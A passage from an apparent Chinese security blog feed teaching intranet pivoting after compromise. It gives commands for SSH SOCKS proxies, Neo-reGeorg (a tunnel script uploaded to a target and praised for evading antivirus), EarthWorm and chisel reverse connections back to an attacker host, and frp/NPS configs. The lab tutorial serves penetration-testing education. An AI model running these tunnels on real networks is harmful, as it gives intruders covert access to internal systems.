4&#x2F;5代理通道</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh -CfNg -D 7000 root@192.168.43.37<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/image-20240107163723443.png" alt="image-20240107163723443">成功后配置proxychains</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">vi /etc/proxychains.conf<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/image-20240107163730795.png" alt="image-20240107163730795"><br><img src="/2022/06/15/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/image-20240107163739167.png" alt="image-20240107163739167"><br>成功访问到内网主机</p><p>动态端口映射就是建立一个ssh加密的socks 4&#x2F;5代理通道。任何支持 socks 4&#x2F;5协议的程序都可以使用这个加密通道进行代理访问。</p><p><strong>2.4 HTTP&#x2F;HTTPS协议</strong><br>HTTP Service代理用于将所有的流量转发到内网。常见的代理工具有reGeorg,meterpreter,tunna等</p><ul><li>reGeorg<br>reGeorg支持ASPX,PHP,JSP等web脚本，并提供了一个Tomcat5版本。<br>这里使用Neo-reGeorg是大佬改版的reGeorg。<br>它的优势是做了加密处理，避免特征检测，生成的脚本也免杀！！</li></ul><p>实验环境：</p><p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/image-20240107163814492.png" alt="image-20240107163814492"></p><p>首先先生成加密脚本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python .\neoreg.py generate -k one<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/image-20240107163825010.png" alt="image-20240107163825010"><br>将相应脚本文件上传到目标服务器上<br><img src="/2022/06/15/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/image-20240107163832513.png" alt="image-20240107163832513"><br>攻击上运行进行隧道建立</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python neoreg.py -k one -u http://192.168.43.58/tunnel.php<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/image-20240107163841466.png" alt="image-20240107163841466"></p><p>成功建立的连接<br>配置本地代理</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">vi /etc/proxychains.conf<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/image-20240107163849711.png" alt="image-20240107163849711"><br>测试与目标机连通<br><img src="/2022/06/15/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E9%9A%90%E8%97%8F/image-20240107163857903.png" alt="image-20240107163857903"></p>]]></content>
    
    
    <categories>
      
      <category>内网安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>内网安全</tag>
      
      <tag>隧道隐藏</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>内网穿透</title>
    <link href="/2022/06/15/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/"/>
    <url>/2022/06/15/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在渗透中拿到一台边缘机器后剩余内网机器不出网的情况很常见，这时我们就需要把内网机器流量转到边缘机器上再进行访问，内网流量转出来的方法很多，在下面就介绍几种常见的方法</p><p><strong>EarhWorm</strong></p><p>ew参数说明：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">-f : 设置连接主机地址。<br>-g : 设置连接端口。<br>-d : 设置反连主机地址。<br>-e : 设置反连端口。<br>-l : 为服务启动打开一个端口。<br>-s :  状态设置功能。<br></code></pre></td></tr></table></figure><p>6中链路状态 -s参数：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssocksd    rcsocks   rssocks<br>lcx_slave  lcx_tran  lcx_listen<br>其中 SOCKS5 服务的核心逻辑支持由 ssocksd 和 rssocks 提供，分别对应正向与反向socks代理。<br><br>lcx 链路状态用于打通测试主机同 socks 服务器之间的通路。<br><br>lcx_slave 控制管道：一侧通过反弹方式连接代理请求方，另一侧连接代理提供主机。<br><br>lcx_tran 转发管道：通过监听本地端口接收代理请求，并转交给代理提供主机。<br><br>lcx_listen 监听管道：通过监听本地端口接收数据，并将其转交给目标网络回连的代理提供主机。<br><br>通过组合lcx类别管道的特性，可以实现多层内网环境下的渗透测试。<br></code></pre></td></tr></table></figure><p>实验环境：<br><img src="/2022/06/15/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20240107155935229.png" alt="image-20240107155935229"></p><p>EW是一套便携式的网络工具，具有SOCKS5服务架设和端口转发两大核心功能，可以在复杂的网络环境中实现网络穿透。同时EW能够以正向，反向，多级级联等方式建立网络隧道。<br>（1）正向连接<br>在web服务器上执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ew  -s ssocksd -l 8888<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20240107155943083.png" alt="image-20240107155943083">在socksCap64添加这个IP地址的代理<br><img src="/2022/06/15/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20240107155952271.png" alt="image-20240107155952271"><br>在攻击机上访问内网目标主机：<br><img src="/2022/06/15/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20240107160003617.png" alt="image-20240107160003617"></p><p>（2）反向连接<br>在web服务器上执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ew -s rssocks -d 192.168.43.234 -e 1111<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20240107160011248.png" alt="image-20240107160011248"></p><p>在攻击上执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ew  -s rcsocks -l 1008 -e 888<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20240107160019595.png" alt="image-20240107160019595"></p><p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20240107160028898.png" alt="image-20240107160028898"></p><p>更多参考：<a href="https://www.freebuf.com/sectool/259634.html">https://www.freebuf.com/sectool/259634.html</a></p><p><strong>Neo-reGeorg</strong><br>它是由reGeorg经过大佬改版的。<br>它的优势是做了加密处理，避免特征检测，生成的脚本也免杀！！<br>实验环境：<br><img src="/2022/06/15/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20240107160045055.png" alt="image-20240107160045055"><br>首先先生成加密脚本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python .\neoreg.py generate -k one<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20240107160054903.png" alt="image-20240107160054903"></p><p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20240107160104847.png" alt="image-20240107160104847"><br>攻击上运行进行隧道建立</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python neoreg.py -k one -u http://192.168.43.58/tunnel.php<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20240107160124136.png" alt="image-20240107160124136"><br>成功建立的连接<br>配置本地代理</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">vi /etc/proxychains.conf<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20240107160133759.png" alt="image-20240107160133759">测试与目标机连通<br><img src="/2022/06/15/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20240107160144683.png" alt="image-20240107160144683"><strong>frp</strong><br>攻击机设置frps.ini</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">[common]<br>bind_port = 6666<br></code></pre></td></tr></table></figure><p>运行如下命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">frps.exe -c frps.ini<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20240107160156584.png" alt="image-20240107160156584"></p><p>在边缘机器设置frpc.ini</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">[common]<br>server_addr = 192.168.10.3<br>server_port = 6666<br>[http_proxy]<br><span class="hljs-built_in">type</span>=tcp<br>remote_port=7777<br>plugin=socks5<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20240107160204408.png" alt="image-20240107160204408"><br><img src="/2022/06/15/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20240107160216228.png" alt="image-20240107160216228"></p><p><strong>NPS</strong><br>NPS工具是一款使用go语言编写的轻量级、功能强大的内网穿透工具。支持TCP、UDP流量转发，支持内网HTTP、SOCKS5代理，同时支持snappy压缩(节省带宽和流量)、站点保护、加密传输、多路复用、header修改等。同时还支持web图形化管理。该工具使用简单，相比于FRP，NPS是图形化界面，因此配置更加简单。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">项目地址：https://github.com/ehang-io/nps/releases/tag/v0.26.9 <br></code></pre></td></tr></table></figure><p>服务端配置文件如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><code class="hljs bash">appname = nps<br><span class="hljs-comment">#Boot mode(dev|pro)</span><br>runmode = dev<br><br><span class="hljs-comment">#HTTP(S) proxy port, no startup if empty</span><br>http_proxy_ip=0.0.0.0<br>http_proxy_port=80     <span class="hljs-comment">#域名代理http代理监听端口</span><br>https_proxy_port=443   <span class="hljs-comment">#域名代理https代理监听端口(一般会修改这两个端口，避免端口冲突)</span><br>https_just_proxy=<span class="hljs-literal">true</span><br><span class="hljs-comment">#default https certificate setting</span><br>https_default_cert_file=conf/server.pem<br>https_default_key_file=conf/server.key<br><br><span class="hljs-comment">##bridge</span><br>bridge_type=tcp      <span class="hljs-comment">#客户端与服务端连接方式kcp或tcp</span><br>bridge_port=8024     <span class="hljs-comment">#服务端客户端通信端口，也就是说客户端通过访问服务端的这个端口可以进行连接</span><br>bridge_ip=0.0.0.0<br><br><span class="hljs-comment"># Public password, which clients can use to connect to the server</span><br><span class="hljs-comment"># After the connection, the server will be able to open relevant ports and parse related domain names according to its own configuration file.</span><br>public_vkey=123      <span class="hljs-comment">#客户端以配置文件模式启动时的密钥，设置为空表示关闭客户端配置文件连接模式</span><br><br><span class="hljs-comment">#Traffic data persistence interval(minute)</span><br><span class="hljs-comment">#Ignorance means no persistence</span><br><span class="hljs-comment">#flow_store_interval=1   #服务端流量数据持久化间隔，单位分钟，忽略表示不持久化</span><br><br><span class="hljs-comment"># log level LevelEmergency-&gt;0  LevelAlert-&gt;1 LevelCritical-&gt;2 LevelError-&gt;3 LevelWarning-&gt;4 LevelNotice-&gt;5 LevelInformational-&gt;6 LevelDebug-&gt;7</span><br>log_level=7         <span class="hljs-comment">#日志输出级别</span><br><span class="hljs-comment">#log_path=nps.log</span><br><br><span class="hljs-comment">#Whether to restrict IP access, true or false or ignore</span><br><span class="hljs-comment">#ip_limit=true      #是否限制ip访问，true或false或忽略</span><br><br><span class="hljs-comment">#p2p</span><br><span class="hljs-comment">#p2p_ip=127.0.0.1    #服务端IP，使用p2p模式必填</span><br><span class="hljs-comment">#p2p_port=6000       #p2p模式开启的udp端口</span><br><br><span class="hljs-comment">#web</span><br>web_host=a.o.com<br>web_username=admin   <span class="hljs-comment">#web界面管理账号</span><br>web_password=123     <span class="hljs-comment">#web界面管理密码</span><br>web_port = 8080      <span class="hljs-comment">#web管理端口，通过访问该端口可以访问NPS后台</span><br>web_ip=0.0.0.0<br>web_base_url=        <span class="hljs-comment">#web管理主路径,用于将web管理置于代理子路径后面</span><br>web_open_ssl=<span class="hljs-literal">false</span><br>web_cert_file=conf/server.pem<br>web_key_file=conf/server.key<br><span class="hljs-comment"># if web under proxy use sub path. like http://host/nps need this.</span><br><span class="hljs-comment">#web_base_url=/nps</span><br><br><span class="hljs-comment">#Web API unauthenticated IP address(the len of auth_crypt_key must be 16)</span><br><span class="hljs-comment">#Remove comments if needed</span><br><span class="hljs-comment">#auth_key=test       #web api密钥</span><br>auth_crypt_key =1234567812345678    <span class="hljs-comment">#获取服务端authKey时的aes加密密钥，16位</span><br><br><span class="hljs-comment">#allow_ports=9001-9009,10001,11000-12000</span><br><br><span class="hljs-comment">#Web management multi-user login</span><br>allow_user_login=<span class="hljs-literal">false</span><br>allow_user_register=<span class="hljs-literal">false</span><br>allow_user_change_username=<span class="hljs-literal">false</span><br><br><br><span class="hljs-comment">#extension</span><br>allow_flow_limit=<span class="hljs-literal">false</span><br>allow_rate_limit=<span class="hljs-literal">false</span><br>allow_tunnel_num_limit=<span class="hljs-literal">false</span><br>allow_local_proxy=<span class="hljs-literal">false</span><br>allow_connection_num_limit=<span class="hljs-literal">false</span><br>allow_multi_ip=<span class="hljs-literal">false</span><br>system_info_display=<span class="hljs-literal">false</span><br><br><span class="hljs-comment">#cache</span><br>http_cache=<span class="hljs-literal">false</span><br>http_cache_length=100<br><br><span class="hljs-comment">#get origin ip</span><br>http_add_origin_header=<span class="hljs-literal">false</span><br><br><span class="hljs-comment">#pprof debug options</span><br><span class="hljs-comment">#pprof_ip=0.0.0.0       #debug pprof 服务端IP</span><br><span class="hljs-comment">#pprof_port=9999        #debug pprof 端口</span><br><br><span class="hljs-comment">#client disconnect timeout</span><br>disconnect_timeout=60   <span class="hljs-comment">#客户端连接超时，单位 5s，默认值 60，即 300s = 5mins</span><br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20240107160229829.png" alt="image-20240107160229829"><br>运行即可：<br><img src="/2022/06/15/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20240107160238500.png" alt="image-20240107160238500"><br>登录web界面   admin&#x2F;123<br>配置<br><img src="/2022/06/15/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20240107160247561.png" alt="image-20240107160247561"><br><img src="/2022/06/15/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20240107160257667.png" alt="image-20240107160257667"><br>点击添加<br><img src="/2022/06/15/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20240107160306745.png" alt="image-20240107160306745"><br><img src="/2022/06/15/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20240107160316184.png" alt="image-20240107160316184"><br>客户端配置文件：</p><p>友情提示:这里将配置文件写出来主要是为了让大家了解配置文件的内容，如果觉得配置文件太过繁琐，大多数情况下只需要关注server_addr、conn_type、和vkey这三个参数即可。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><code class="hljs bash">[common]<br>server_addr=127.0.0.1:8024<br>conn_type=tcp<br>vkey=123<br>auto_reconnection=<span class="hljs-literal">true</span><br>max_conn=1000<br>flow_limit=1000<br>rate_limit=1000<br>basic_username=11<br>basic_password=3<br>web_username=user<br>web_password=1234<br>crypt=<span class="hljs-literal">true</span><br>compress=<span class="hljs-literal">true</span><br><span class="hljs-comment">#pprof_addr=0.0.0.0:9999</span><br>disconnect_timeout=60<br><br>[health_check_test1]<br>health_check_timeout=1<br>health_check_max_failed=3<br>health_check_interval=1<br>health_http_url=/<br>health_check_type=http<br>health_check_target=127.0.0.1:8083,127.0.0.1:8082<br><br>[health_check_test2]<br>health_check_timeout=1<br>health_check_max_failed=3<br>health_check_interval=1<br>health_check_type=tcp<br>health_check_target=127.0.0.1:8083,127.0.0.1:8082<br><br>[web]<br>host=c.o.com<br>target_addr=127.0.0.1:8083,127.0.0.1:8082<br><br>[tcp]<br>mode=tcp<br>target_addr=127.0.0.1:8080<br>server_port=10000<br><br>[socks5]<br>mode=socks5<br>server_port=19009<br>multi_account=multi_account.conf<br><br>[file]<br>mode=file<br>server_port=19008<br>local_path=/Users/liuhe/Downloads<br>strip_pre=/web/<br><br>[http]<br>mode=httpProxy<br>server_port=19004<br><br>[udp]<br>mode=udp<br>server_port=12253<br>target_addr=114.114.114.114:53<br><br>[ssh_secret]<br>mode=secret<br>password=ssh2<br>target_addr=123.206.77.88:22<br><br>[ssh_p2p]<br>mode=p2p<br>password=ssh3<br><br>[secret_ssh]<br>local_port=2001<br>password=ssh2<br><br>[p2p_ssh]<br>local_port=2002<br>password=ssh3<br>target_addr=123.206.77.88:22<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">server_addr   <span class="hljs-comment">#服务端ip/域名:port</span><br>conn_type       <span class="hljs-comment">#与服务端通信模式(tp或kcp)</span><br>vkey           <span class="hljs-comment">#服务端配置文件中的密钥</span><br></code></pre></td></tr></table></figure><p>配置好后直接运行即可  npc.exe<br>也可以不要配置文件运行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><br>Windows：<br>    npc.exe -server=ip:8024 -vkey=P@ssword<br>Linux：<br>    ./npc -server=xx.xx.xx.xx:8024 -vkey=P@ssword<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20240107160327050.png" alt="image-20240107160327050"><br>在线了<br><img src="/2022/06/15/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20240107160335909.png" alt="image-20240107160335909"></p><p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20240107160346237.png" alt="image-20240107160346237"><br>通过内网地址连接到主机</p><p><strong>chisel</strong><br>项目地址：<a href="https://github.com/jpillora/chisel/releases/tag/v1.7.4">https://github.com/jpillora/chisel/releases/tag/v1.7.4</a></p><p>Chisel 可用来搭建内网隧道，类似于常用的 frp 和 nps 之类的工具。由于目前使用的人比较少，因此对于有些杀软还不能准确的识别出该工具。chisel 可以进行端口转发、反向端口转发以及 Socks 流量代理，使用 go 语言编写，支持多个平台使用，是进行内网穿透的一个鲜为人知的好工具</p><p>工具使用：<br>这个工具和其他工还有一点不同，就是没有服务器和客户端，只有一个可执行文件。可以通过执行这个文件，让其充当服务器端或者客户端</p><p>查看帮助信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#查看客户端帮助信息</span><br>chisel server -<span class="hljs-built_in">help</span><br>chisel client -<span class="hljs-built_in">help</span><br></code></pre></td></tr></table></figure><ul><li>端口转发<br>（1）正向连接<br>在目标机上开启服务监听：</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">chisel.exe server -p 1234<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20240107160401745.png" alt="image-20240107160401745">在攻击上执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">chisel.exe client 192.168.43.215:1234 1111:127.0.0.1:3389<br></code></pre></td></tr></table></figure><p>意思是将目标机的3389端口转发到本地的1111端口上<br><img src="/2022/06/15/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20240107160410368.png" alt="image-20240107160410368"><br><img src="/2022/06/15/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20240107160419402.png" alt="image-20240107160419402"><br>连上了。<br>（2)反向连接<br>在目标机中执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">chisel.exe client 192.168.43.234:1234 R:1111:127.0.0.1:3389<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20240107160601106.png" alt="image-20240107160601106"></p><p>在攻击机上执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">chisel.exe server -p 1234 --reverse<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20240107160608394.png" alt="image-20240107160608394">在本地访问127.0.0.1就是访问的目标机的3389<br><img src="/2022/06/15/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20240107160619430.png" alt="image-20240107160619430"></p><ul><li>socks代理<br><img src="/2022/06/15/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20240107160630053.png" alt="image-20240107160630053"><br>（1)正向连接<br>在攻击上执行：</li></ul><figure class="highlight bash"><table><tr><td 